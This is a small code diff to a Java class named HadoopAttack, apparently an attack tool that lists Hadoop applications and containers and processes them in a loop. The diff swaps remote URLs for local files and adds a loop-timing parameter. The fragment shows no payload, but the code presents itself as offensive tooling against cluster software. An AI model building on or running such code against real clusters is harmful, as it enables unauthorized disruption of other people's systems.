@@ -14,10 +14,11 @@ import com.hadoop.common.Tools;
  */
 public class HadoopAttack {
 	public static String allContainerFix = "/node/allContainers";
-	private static String masterUrl = "http://1.brainoverflow.sinaapp.com/master.html";
-	private static String clusterUrl = "http://1.brainoverflow.sinaapp.com/cluster.html";
+	private static String masterUrl = "master.html";
+	private static String clusterUrl = "cluster.html";
 	private static String encoding = "UTF-8";
 	private static String user = "hadoop";
+	private static int loopTime = 1000;
 
 	public static void main(String[] args) {
 		if (args.length == 3) {
@@ -36,7 +37,7 @@ public class HadoopAttack {
 							encoding);
 					ContainerProcessor containerProcessor = new ContainerProcessor(
 							app, slavers);
-					containerProcessor.run();
+					containerProcessor.run(loopTime);
 					boolean running = true;
 					while (running) {
 						List<Application> appList2 = Tools.getAppList(
